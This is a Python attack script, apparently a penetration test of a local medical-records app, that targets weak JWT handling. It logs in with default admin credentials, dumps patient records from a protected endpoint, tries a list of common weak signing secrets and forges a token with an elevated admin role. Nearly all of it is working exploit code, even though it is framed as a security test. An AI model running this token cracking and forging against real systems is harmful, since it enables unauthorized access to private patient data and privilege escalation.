"""
JWT Token Manipulation Attack
==============================
Tests weak JWT implementation vulnerabilities
"""

import requests
import base64
import json

BASE_URL = "http://localhost:8080"

def decode_jwt(token):
    """Decode JWT without verification"""
    parts = token.split('.')
    if len(parts) != 3:
        return None
    
    # Decode header and payload (add padding if needed)
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    
    return header, payload

def test_jwt_attack():
    print("\n" + "="*50)
    print("JWT TOKEN MANIPULATION ATTACK")
    print("="*50)
    
    # Step 1: Get a valid token
    print("\n[*] Step 1: Obtaining valid token...")
    login_response = requests.post(
        f"{BASE_URL}/api/login",
        json={"username": "admin", "password": "password123"}
    )
    
    if login_response.status_code != 200:
        print("    [FAILED] Could not get token")
        return
    
    token = login_response.json()["access_token"]
    print(f"    [SUCCESS] Got token: {token[:50]}...")
    
    # Step 2: Decode token
    print("\n[*] Step 2: Decoding token...")
    header, payload = decode_jwt(token)
    print(f"    Header: {header}")
    print(f"    Payload: {payload}")
    
    # Step 3: Test token on protected endpoint
    print("\n[*] Step 3: Testing token on /api/patients...")
    response = requests.get(
        f"{BASE_URL}/api/patients",
        headers={"Authorization": f"Bearer {token}"}
    )
    
    if response.status_code == 200:
        print("    [SUCCESS] Access granted!")
        data = response.json()
        print(f"    Retrieved {len(data.get('patients', []))} patient records")
        for patient in data.get('patients', []):
            print(f"    -> {patient}")
    
    # Step 4: Test with modified role (if algorithm was 'none')
    print("\n[*] Step 4: Checking for algorithm confusion vulnerability...")
    print("    Note: Full exploitation would require the 'none' algorithm")
    print("    or knowing the weak secret key")
    
    # Common weak secrets to try
    weak_secrets = ["secret", "password", "key", "jwt", "super-secret-jwt-key"]
    print(f"\n[*] Step 5: Testing {len(weak_secrets)} common weak secrets...")
    
    from jose import jwt as jose_jwt
    
    for secret in weak_secrets:
        try:
            decoded = jose_jwt.decode(token, secret, algorithms=["HS256"])
            print(f"    [CRACKED!] Secret is: '{secret}'")
            print(f"    Decoded payload: {decoded}")
            
            # Now we can forge tokens
            print("\n[*] Step 6: Forging admin token with elevated role...")
            forged_payload = decoded.copy()
            forged_payload["role"] = "admin"
            forged_token = jose_jwt.encode(forged_payload, secret, algorithm="HS256")
            print(f"    Forged token: {forged_token[:50]}...")
            break
        except:
            print(f"    [-] '{secret}' - not the secret")
    
    print("\n" + "="*50)
    print("FINDINGS:")
    print("- JWT secret is weak and guessable")
    print("- Tokens can be forged with elevated privileges")
    print("- Role claim in token is not verified server-side")
    print("="*50)

if __name__ == "__main__":
    test_jwt_attack()
